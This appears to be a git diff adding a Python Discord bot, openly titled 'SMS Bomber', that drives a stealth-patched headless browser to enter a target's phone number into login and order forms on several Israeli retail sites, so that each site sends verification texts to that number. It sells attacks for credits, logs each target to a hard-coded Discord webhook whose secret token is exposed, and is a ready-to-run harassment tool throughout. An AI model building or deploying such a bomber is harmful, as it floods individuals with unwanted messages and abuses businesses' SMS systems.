@@ -1,0 +1,85 @@
+import discord
+from discord.ext import commands
+from playwright.sync_api import sync_playwright
+from playwright_stealth import stealth
+import asyncio
+import os
+import requests
+from datetime import datetime
+
+# משיכת הטוקן מהגדרות השרת (Render) כדי לשמור על אבטחה בגיטהאב
+TOKEN = os.getenv('DISCORD_TOKEN')
+WEBHOOK_URL = 'https://discord.com/api/webhooks/1499107473347313846/VN0GUsgF-yvXR5KoUszjJuIZbBqqYFs6hIVhGe-ZF7ppMqGDLW4WY-zZbYPk23ls2nl4'
+
+user_credits = {"nehoray._.ayosef": 100} 
+sites = [
+    {"name": "Pizza Hut", "url": "https://order.pizzahut.co.il/order/order-type"},
+    {"name": "Ace", "url": "https://www.ace.co.il/customer/account/login/"},
+    {"name": "Castro", "url": "https://www.castro.com/customer/account/login/"}
+]
+
+intents = discord.Intents.default()
+intents.message_content = True
+bot = commands.Bot(command_prefix="!", intents=intents)
+
+def send_to_log(user, details):
+    now = datetime.now().strftime("%d.%m.%Y, %H:%M:%S")
+    log_message = f"👤 *משתמש:* {user}\n⏰ *זמן:* {now}\n📝 *פרטים:* {details}"
+    try:
+        requests.post(WEBHOOK_URL, json={"content": log_message})
+    except:
+        pass
+
+def run_attack(site, phone, user):
+    with sync_playwright() as p:
+        browser = None
+        try:
+            # חייב להיות headless=True כדי לעבוד בשרת חיצוני
+            browser = p.chromium.launch(headless=True)
+            context = browser.new_context(user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
+            page = context.new_page()
+            stealth(page)
+            
+            page.goto(site['url'], wait_until="domcontentloaded", timeout=60000)
+            page.wait_for_timeout(3000)
+
+            # חיפוש שדה הטלפון והזנה
+            field = page.locator('input[type="tel"], input[placeholder*="05"], input[name*="phone"]').first
+            if field.is_visible():
+                field.fill(phone)
+                page.wait_for_timeout(1000)
+                page.keyboard.press("Enter")
+                send_to_log(user, f"✅ הצלחה מהענן: {site['name']} | יעד: {phone}")
+                return True
+            
+            send_to_log(user, f"⚠️ שדה לא נמצא ב-{site['name']}")
+        except:
+            send_to_log(user, f"❌ שגיאה טכנית באתר {site['name']}")
+        finally:
+            if browser: browser.close()
+
+@bot.command()
+async def setup(ctx):
+    view = discord.ui.View()
+    btn = discord.ui.Button(label="💣 הפעל מתקפת ענן", style=discord.ButtonStyle.danger)
+    btn.callback = lambda i: i.response.send_modal(SpamModal())
+    view.add_item(btn)
+    await ctx.send("☁️ **SMS Bomber V6.1.1 - Cloud Edition**", view=view)
+
+class SpamModal(discord.ui.Modal, title='SMS Bomber'):
+    phone = discord.ui.TextInput(label='מספר טלפון', placeholder='05XXXXXXXX')
+    async def on_submit(self, interaction: discord.Interaction):
+        user = interaction.user.name
+        if user_credits.get(user, 0) < 2:
+            await interaction.response.send_message("אין לך מספיק קרדיטים!", ephemeral=True)
+            return
+
+        user_credits[user] -= 2
+        send_to_log(user, f"התחלת מתקפה מהענן\n🎯 יעד: {self.phone.value}\n⚡ נוצלו: 2 קרדיטים")
+        await interaction.response.send_message("המתקפה נשלחה לשרת! המחשב שלך יכול לנוח.", ephemeral=True)
+        
+        loop = asyncio.get_event_loop()
+        for site in sites:
+            await loop.run_in_executor(None, run_attack, site, self.phone.value, user)
+
+bot.run(TOKEN)
